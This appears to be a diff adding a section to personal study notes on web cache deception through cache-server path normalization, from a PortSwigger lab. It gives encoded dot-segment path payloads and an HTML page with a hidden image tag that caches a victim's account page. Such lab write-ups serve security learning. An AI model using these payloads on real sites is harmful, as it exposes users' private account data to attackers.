@@ -146,5 +146,48 @@
 
 ----------
 
+### Exploiting normalization by the cache server
 
+----------
 
+- If the cache server resolves encoded dot-segments but the origin server doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure:
+
+```
+/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
+```
+
+- In this situation, path traversal alone isn't sufficient for an exploit. For example, consider how the cache and origin server interpret the payload `/profile%2f%2e%2e%2fstatic`:
+- The cache interprets the path as: `/static` because it url decodes it
+- The origin server interprets the path as: `/profile%2f%2e%2e%2fstatic`
+
+- Always find a delimiter e.g
+- For example, consider the payload `/profile;%2f%2e%2e%2fstatic`. The origin server uses `;` as a delimiter:
+
+- The cache interprets the path as: /static
+- The origin server interprets the path as: /profile
+ 
+-----------------
+
+### Challenge-:  Exploiting cache server normalization for web cache deception
+
+-----------------
+
+- The cache server decodes and normalizes the url, leaving `/resources` only but the delimeter pops up because the origin-server decodes `#`-:
+
+```
+/my-account%23%2f%2e%2e%2fresources?x=y
+```
+
+- Exploit-:
+
+```html
+<! doctype html>
+<html>
+<img src="https://0a0b00bb037199bf8098120f00cc00fa.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?foo=y" width="0" height="0" />
+</html>
+```
+- Hit-:
+
+<img width="772" height="289" alt="image" src="https://github.com/user-attachments/assets/efa1b2a6-4329-4e19-8830-ba461a497a78" />
+
+----------------
